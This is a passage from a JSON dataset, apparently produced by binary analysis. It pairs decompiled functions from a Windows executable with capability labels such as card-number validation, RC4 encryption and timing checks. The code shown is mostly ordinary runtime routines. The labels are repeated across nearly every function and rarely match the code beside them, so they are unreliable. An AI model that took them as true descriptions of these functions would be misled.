        "decompiled_code": "\nvoid __cdecl\nfcn.00403954(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    uint var_4h;\n    \n    fcn.0040595c(arg_8h, arg_ch, arg_14h);\n    fcn.0040146f(arg_8h + arg_14h, arg_18h, arg_1ch);\n    fcn.0040595c(arg_8h + arg_14h + arg_18h, arg_ch + arg_14h, (arg_10h - arg_14h) + 1);\n    return;\n}\n",
        "token_count": 162
    },
    "00403963": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00403963(int16_t *arg_8h, int16_t *arg_ch)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    \n    if (*arg_8h != 0) {\n        do {\n            if (*arg_ch != 0) {\n                iVar1 = *arg_8h;\n                piVar3 = arg_ch;\n                iVar2 = *arg_ch;\n                do {\n                    if (iVar2 == iVar1) {\n                        return arg_8h;\n                    }\n                    piVar3 = piVar3 + 1;\n                    iVar2 = *piVar3;\n                    iVar1 = *arg_8h;\n                } while (iVar2 != 0);\n            }\n            arg_8h = arg_8h + 1;\n        } while (*arg_8h != 0);\n    }\n    return NULL;\n}\n",
        "token_count": 203
    },
    "004039d1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004039d1(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return *(param_1 + 0x40);\n}\n",
        "token_count": 42
    },
    "004039e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004039e0(int32_t arg_8h)\n\n{\n    return arg_8h * 0x38 + 0x571d88;\n}\n",
        "token_count": 42
    },
    "00403a1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403a1c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    puVar2 = *(in_ECX + 0x34);\n    if (0 < arg_8h) {\n        do {\n            if (*puVar2 == 0) {\n                return iVar3;\n            }\n            iVar1 = fcn.00406203(***(in_ECX + 8), *puVar2, 0x8000);\n            if (iVar1 != 0) {\n                puVar2 = puVar2 + 1;\n            }\n            puVar2 = puVar2 + 1;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_8h);\n    }\n    return iVar3;\n}\n",
        "token_count": 205
    },
    "00403a35": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00403a35(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00406924();\n    if (iVar1 == 0) {\n        return 0x571e5c;\n    }\n    return iVar1 + 0x10;\n}\n",
        "token_count": 66
    },
    "00403a8f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403a8f(int32_t arg_8h, uint32_t arg_ch, int32_t *arg_10h)\n\n{\n    uint32_t uVar1;\n    double dVar2;\n    int32_t iVar3;\n    uint16_t uVar4;\n    \n    dVar2 = CONCAT17(arg_ch._3_1_, CONCAT16(arg_ch._2_1_, CONCAT24(arg_ch, arg_8h)));\n    if (dVar2 == 0.0) {\n        iVar3 = 0;\n    }\n    else if (((arg_ch & 0x7ff00000) == 0) && (((arg_ch & 0xfffff) != 0 || (arg_8h != 0)))) {\n        iVar3 = -0x3fd;\n        if ((arg_ch & 0x100000) == 0) {\n            do {\n                uVar1 = arg_ch * 2;\n                arg_ch._0_2_ = uVar1;\n                arg_ch = uVar1;\n                if (arg_8h < 0) {\n                    arg_ch = uVar1 | 1;\n                }\n                arg_8h = arg_8h * 2;\n                iVar3 = iVar3 + -1;\n            } while ((uVar1 & 0x100000) == 0);\n            arg_ch = uVar1 & 0xffff0000 | arg_ch;\n        }\n        uVar4 = arg_ch >> 0x10 & 0xffef;\n        arg_ch._2_1_ = uVar4;\n        arg_ch._3_1_ = uVar4 >> 8;\n        if (((0.0 < dVar2) << 8 | (dVar2 == 0.0) << 0xe) == 0) {\n            arg_ch._3_1_ = arg_ch._3_1_ | 0x80;\n        }\n        fcn.004052e0(arg_8h, CONCAT17(arg_ch._3_1_, CONCAT16(arg_ch._2_1_, CONCAT24(arg_ch, arg_8h))) >> 0x20, 0);\n    }\n    else {\n        fcn.004052e0(arg_8h, dVar2 >> 0x20, 0);\n        iVar3 = (arg_ch >> 0x14 & 0x7ff) - 0x3fe;\n    }\n    *arg_10h = iVar3;\n    return;\n}\n",
        "token_count": 540
    },
    "00403af8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_280h\n// WARNING: Variable defined which should be unmapped: var_260h\n// WARNING: Variable defined which should be unmapped: var_284h\n// WARNING: Variable defined which should be unmapped: var_288h\n\nvoid __cdecl fcn.00403af8(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    ulong uVar4;\n    uint *puStack828;\n    uint *puStack824;\n    uint uStack820;\n    uint uStack816;\n    uint var_324h;\n    uint var_298h;\n    uint var_294h;\n    uint var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint var_284h;\n    uint var_280h;\n    uint var_27ch;\n    uint var_278h;\n    uint var_274h;\n    uint var_270h;\n    uint var_26ch;\n    uint var_268h;\n    uint32_t var_264h;\n    uchar *var_260h;\n    uint var_25ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_4ch;\n    uint *ExceptionInfo;\n    uint *var_4h;\n    \n    uStack816 = 0x17;\n    uStack820 = 0x461f9b;\n    iVar2 = (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)();\n    if (iVar2 != 0) {\n        pcVar1 = swi(0x29);\n        (*pcVar1)();\n    }\n    uStack820 = 3;\n    puStack824 = 0x461fab;\n    fcn.00405056();\n    uStack820 = 0x2cc;\n    puStack828 = &fcn.00403af8::var_324h;\n    puStack824 = NULL;\n    uVar4 = fcn.00403189();\n    var_264h = (in_NT & 1) * 0x4000 | SCARRY4(&stack0xfffffcc4, 0xc) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100\n               | (&stack0xfffffcd0 < 0) * 0x80 | (*0x10 == 0x330) * 0x40 | (in_AF & 1) * 0x10 |\n               ((POPCOUNT(&stack0xfffffcd0 & 0xff) & 1U) == 0) * 4 | 0xfffffff3 < &stack0xfffffcc4 |\n               (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    var_324h = 0x10001;\n    uStack820 = 0x50;\n    puStack828 = &fcn.00403af8::var_58h;\n    puStack824 = NULL;\n    var_260h = *0x10;\n    fcn.00403189();\n    var_27ch = uVar4 >> 0x20;\n    var_274h = uVar4;\n    var_58h = 0x40000015;\n    var_54h = 1;\n    uStack820 = 0x462067;\n    iVar2 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    var_27ch = uVar4 >> 0x20;\n    var_274h = uVar4;\n    uStack820 = 0;\n    ExceptionInfo = &fcn.00403af8::var_58h;\n    var_4h = &fcn.00403af8::var_324h;\n    puStack824 = 0x462087;\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)();\n    var_27ch = uVar4 >> 0x20;\n    var_274h = uVar4;\n    puStack824 = &fcn.00403af8::ExceptionInfo;\n    puStack828 = 0x462091;\n    iVar3 = (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)();\n    var_27ch = uVar4 >> 0x20;\n    var_274h = uVar4;\n    if ((iVar3 == 0) && (iVar2 != 1)) {\n        puStack828 = 0x3;\n        fcn.00405056();\n        var_27ch = uVar4 >> 0x20;\n        var_274h = uVar4;\n    }\n    return;\n}\n",
        "token_count": 1109
    },
    "00403b02": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __fastcall fcn.00403b02(uint param_1)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00402a0e(param_1);\n    fcn.00402dab();\n    return;\n}\n",
        "token_count": 74
    },
    "00403bf7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00403bf7(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    cVar1 = **0x574458;\n    if (cVar1 != '\\0') {\n        if (('/' < cVar1) && (cVar1 < ':')) {\n            *0x574458 = *0x574458 + 1;\n            return cVar1 + -0x2f;\n        }\n        iVar2 = 0;\n        while( true ) {\n            if (cVar1 == '@') {\n                if (**0x574458 != '@') {\n                    *0x574458 = *0x574458 + 1;\n                    return -1;\n                }\n                *0x574458 = *0x574458 + 1;\n                return iVar2;\n            }\n            if (cVar1 == '\\0') break;\n            if (cVar1 < 'A') {\n                return -1;\n            }\n            if ('P' < cVar1) {\n                return -1;\n            }\n            iVar2 = iVar2 * 0x10 + -0x41 + cVar1;\n            *0x574458 = *0x574458 + 1;\n            cVar1 = **0x574458;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 285
    },
    "00403c10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403c10(uint noname_0, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = fcn.004019c9(arg_ch);\n    *in_ECX = *puVar1;\n    return;\n}\n",
        "token_count": 81
    },
    "00403c15": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00403c15(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004022de(0x56f848, 0x10);\n    if (*(unaff_EBP + 8) < 0x2000) {\n        uVar3 = 0;\n        *(unaff_EBP + -0x1c) = 0;\n        fcn.00406505(7);\n        *(unaff_EBP + -4) = 0;\n        iVar4 = 0;\n        iVar2 = *0x575488;\n        while (*(unaff_EBP + -0x20) = iVar4,  iVar2 <= *(unaff_EBP + 8)) {\n            if (*(iVar4 * 4 + 0x575220) == 0) {\n                iVar2 = fcn.0040639d();\n                *(iVar4 * 4 + 0x575220) = iVar2;\n                if (iVar2 == 0) {\n                    uVar3 = 0xc;\n                    *(unaff_EBP + -0x1c) = 0xc;\n                    break;\n                }\n                iVar2 = *0x575488 + 0x40;\n                *0x575488 = iVar2;\n            }\n            iVar4 = iVar4 + 1;\n        }\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.004cbf50();\n    }\n    else {\n        puVar1 = fcn.00403a35();\n        uVar3 = 9;\n        *puVar1 = 9;\n        fcn.004037ce();\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar3;\n}\n",
        "token_count": 466
    },
    "00403c9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00403c9c(int16_t *arg_8h, int16_t *arg_ch, int16_t *arg_10h)\n\n{\n    if (arg_8h != arg_ch) {\n        do {\n            if (*arg_8h == *arg_10h) {\n                return arg_8h;\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h != arg_ch);\n    }\n    return arg_8h;\n}\n",
        "token_count": 116
    },
    "00403cf1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00403cf1(void)\n\n{\n    uint var_4h;\n    \n    return 0xb5e;\n}\n",
        "token_count": 29
    },
    "00403d23": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403d23(uint arg_8h)\n\n{\n    uint arg_10h;\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h = fcn.0040257c();\n    fcn.00405731(arg_8h, *(in_ECX + 0x14), arg_10h);\n    return;\n}\n",
        "token_count": 93
    },
    "00403d32": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403d32(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    fcn.0040325b();\n    iVar1 = fcn.0040629e(in_ECX + 8, arg_8h * 2);\n    if (iVar1 == 0) {\n        *(in_ECX + 0x14) = 1;\n        iVar1 = 0;\n        *(in_ECX + 0xc) = arg_8h;\n    }\n    else {\n        *(in_ECX + 0xc) = 0;\n        *(in_ECX + 0x14) = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 163
    },
    "00403d46": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403d46(uint arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0040273e(arg_8h);\n    return arg_8h;\n}\n",
        "token_count": 54
    },
    "00403d64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403d64(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    puVar2 = *(in_ECX + 0x34);\n    if (0 < arg_8h) {\n        do {\n            if (*puVar2 == 0) {\n                return iVar3;\n            }\n            iVar1 = fcn.00406203(***(in_ECX + 8), *puVar2, 0x8000);\n            if (iVar1 != 0) {\n                puVar2 = puVar2 + 1;\n            }\n            puVar2 = puVar2 + 1;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_8h);\n    }\n    return iVar3;\n}\n",
        "token_count": 204
    },
    "00403d87": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403d87(int32_t arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    fcn.00405830(arg_8h, arg_ch, arg_10h * 2);\n    fcn.00405830(arg_10h * 2 + arg_8h, arg_14h, arg_18h * 2);\n    *(arg_8h + (arg_10h + arg_18h) * 2) = 0;\n    return;\n}\n",
        "token_count": 132
    },
    "00403dfa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403dfa(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t arg_10h_00;\n    uint32_t arg_ch_00;\n    uint arg_ch_01;\n    code *pcVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h_00 = in_ECX[4];\n    if (arg_8h <= 0x7ffffffeU - arg_10h_00) {\n        arg_ch_00 = in_ECX[5];\n        iVar2 = fcn.004035b7(arg_10h_00 + arg_8h, arg_ch_00, 0x7ffffffe);\n        arg_8h_00 = fcn.00404480(iVar2 + 1);\n        in_ECX[4] = arg_10h_00 + arg_8h;\n        in_ECX[5] = iVar2;\n        if (arg_ch_00 < 8) {\n            fcn.00403ecc(arg_8h_00, in_ECX, arg_10h_00, arg_10h, arg_14h);\n        }\n        else {\n            arg_ch_01 = *in_ECX;\n            fcn.00403ecc(arg_8h_00, arg_ch_01, arg_10h_00, arg_10h, arg_14h);\n            fcn.00401654(arg_ch_01, arg_ch_00 * 2 + 2);\n        }\n        *in_ECX = arg_8h_00;\n        return;\n    }\n    fcn.0040393b();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 420
    },
    "00403e09": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00403e09(uint lpLocaleName, uint dwCmpFlags, uint lpString1, int32_t arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    \n    if (0 < arg_14h) {\n        arg_14h = fcn.00403eb8(lpString1, arg_14h);\n    }\n    if (0 < arg_1ch) {\n        arg_1ch = fcn.00403eb8(arg_18h, arg_1ch);\n    }\n    if ((arg_14h == 0) || (arg_1ch == 0)) {\n        if (arg_14h - arg_1ch == 0) {\n            iVar1 = 2;\n        }\n        else {\n            iVar1 = (arg_14h - arg_1ch >> 0x1f & 0xfffffffeU) + 3;\n        }\n    }\n    else {\n        iVar1 = (*_sym.imp.KERNEL32.dll_CompareStringEx)\n                          (lpLocaleName, dwCmpFlags, lpString1, arg_14h, arg_18h, arg_1ch, 0, 0, 0);\n    }\n    return iVar1;\n}\n",
        "token_count": 284
    },
    "00403e36": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403e36(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00402b6c(arg_8h, arg_ch, arg_10h, 0xffffffff);\n    return;\n}\n",
        "token_count": 58
    },
    "00403e3b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403e3b(int32_t arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    fcn.00405830(arg_8h, arg_ch, arg_10h * 2);\n    fcn.00404ce1(arg_10h * 2 + arg_8h, arg_18h, arg_14h);\n    *(arg_8h + (arg_10h + arg_14h) * 2) = 0;\n    return;\n}\n",
        "token_count": 131
    },
    "00403e45": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00403e45(ushort *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t var_4h;\n    \n    uVar1 = fcn.00404dc7(&var_4h, arg_ch, arg_10h, arg_14h);\n    if (uVar1 < 5) {\n        if (0xffff < var_4h) {\n            var_4h = 0xfffd;\n        }\n        if (arg_8h != NULL) {\n            *arg_8h = var_4h;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 157
    },
    "00403e4f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403e4f(uint arg_8h)\n\n{\n    fcn.004c86cf(0, arg_8h, 0, 4);\n    return;\n}\n",
        "token_count": 45
    },
    "00403e59": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00403e59(uint arg_8h)\n\n{\n    uint in_ECX;\n    uint32_t in_stack_ffffffe8;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00403c10(in_stack_ffffffe8 & 0xffffff00 | var_8h, &arg_8h);\n    return in_ECX;\n}\n",
        "token_count": 103
    },
    "00403ea9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403ea9(uint32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_4h;\n    \n    if (*(in_ECX + 0x10) < arg_8h) {\n        fcn.004065a5();\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "00403ecc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403ecc(int32_t arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    fcn.00405830(arg_8h, arg_ch, arg_10h * 2);\n    fcn.00405830(arg_10h * 2 + arg_8h, arg_14h, arg_18h * 2);\n    *(arg_8h + (arg_10h + arg_18h) * 2) = 0;\n    return;\n}\n",
        "token_count": 131
    },
    "00403f58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403f58(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    \n    pcVar1 = fcn.004ca267(0x1c, \"AppPolicyGetProcessTerminationMethod\", 0x5598d4, \"AppPolicyGetProcessTerminationMethod\"\n                         );\n    if (pcVar1 == NULL) {\n        uVar2 = 0xc0000225;\n    }\n    else {\n        (**0x578000)(0xfffffffa, arg_8h);\n        uVar2 = (*pcVar1)();\n    }\n    return uVar2;\n}\n",
        "token_count": 139
    },
    "00403f99": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403f99(uint arg_8h)\n\n{\n    fcn.004aa9f4(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 42
    },
    "00404048": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nuint __cdecl fcn.00404048(uint arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00403b02(&stack0x00000028);\n    fcn.00403b02();\n    return 0xefee;\n}\n",
        "token_count": 81
    },
    "0040407a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.0040407a(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.004040a2(param_1);\n    return;\n}\n",
        "token_count": 57
    },
    "004040a2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004040a2(uint param_1)\n\n{\n    uint var_4h;\n    \n    return param_1;\n}\n",
        "token_count": 32
    },
    "0040411a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0040411a(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *arg_ch = *arg_ch + 0x23;\n    iVar1 = *(*arg_8h + -4);\n    uVar2 = *arg_8h - iVar1;\n    if ((uVar2 < 4) || (0x23 < uVar2)) {\n        fcn.004048ae(uVar2, 4);\n    }\n    *arg_8h = iVar1;\n    return;\n}\n",
        "token_count": 192
    },
    "00404138": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404138(int32_t param_1)\n\n{\n    fcn.00404179(*(param_1 + 8));\n    fcn.00404179(*(param_1 + 0x10));\n    fcn.00404179(*(param_1 + 0x14));\n    return;\n}\n",
        "token_count": 71
    },
    "00404197": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404197(uint arg_8h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.00493c3a(2, \"FlsGetValue\", 0x555f04, 0x555f0c);\n    if (pcVar1 == NULL) {\n        (*_sym.imp.KERNEL32.dll_TlsGetValue)(arg_8h);\n    }\n    else {\n        (**0x578000)();\n        (*pcVar1)();\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "004041ce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004041ce(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    uint32_t uVar1;\n    code *pcVar2;\n    uint *in_ECX;\n    uint var_4h;\n    \n    uVar1 = in_ECX[4];\n    if (arg_8h <= uVar1) {\n        if (in_ECX[5] - uVar1 < arg_ch) {\n            fcn.00404ad9(arg_ch, in_ECX, arg_8h, arg_ch, arg_10h);\n        }\n        else {\n            in_ECX[4] = uVar1 + arg_ch;\n            if (7 < in_ECX[5]) {\n                in_ECX = *in_ECX;\n            }\n            arg_8h_00 = in_ECX + arg_8h * 2;\n            fcn.004059ac(arg_8h_00 + arg_ch * 2, arg_8h_00, (uVar1 - arg_8h) * 2 + 2);\n            fcn.00404ce1(arg_8h_00, arg_10h, arg_ch);\n        }\n        return;\n    }\n    fcn.0040274d();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 309
    },
    "004041ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004041ec(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint arg_8h_00;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00402a0e();\n    arg_ch = fcn.0040407a();\n    arg_8h_00 = fcn.0040407a();\n    fcn.00401f87(arg_8h_00, arg_ch);\n    fcn.0040614a(arg_8h);\n    return;\n}\n",
        "token_count": 124
    },
    "00404273": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404273(int32_t param_1)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t unaff_EBX;\n    \n    uVar1 = *(param_1 + 0x31);\n    *(param_1 + 0x3c) = 0;\n    iVar3 = fcn.00406203(***(param_1 + 8), uVar1, 0x8000);\n    if (iVar3 != 0) {\n        fcn.00403e04(unaff_EBX & 0xffffff00 | uVar1, param_1 + 0x18);\n        cVar2 = **(param_1 + 0x10);\n        *(param_1 + 0x31) = cVar2;\n        *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n        if (cVar2 == '\\0') {\n            puVar4 = fcn.00403a35();\n            *puVar4 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 273
    },
    "004042aa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004042aa(uint32_t arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint32_t arg_ch;\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h < 0x7fffffff) {\n        arg_ch = in_ECX[5];\n        iVar2 = fcn.004035b7(arg_8h, arg_ch, 0x7ffffffe);\n        iVar3 = fcn.00404480(iVar2 + 1);\n        in_ECX[5] = iVar2;\n        in_ECX[4] = arg_8h;\n        fcn.00405830(iVar3, arg_10h, arg_8h * 2);\n        *(arg_8h * 2 + iVar3) = 0;\n        if (7 < arg_ch) {\n            fcn.00401654(*in_ECX, arg_ch * 2 + 2);\n        }\n        *in_ECX = iVar3;\n        return;\n    }\n    fcn.0040393b();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 291
    },
    "004042af": {
        "rules": [
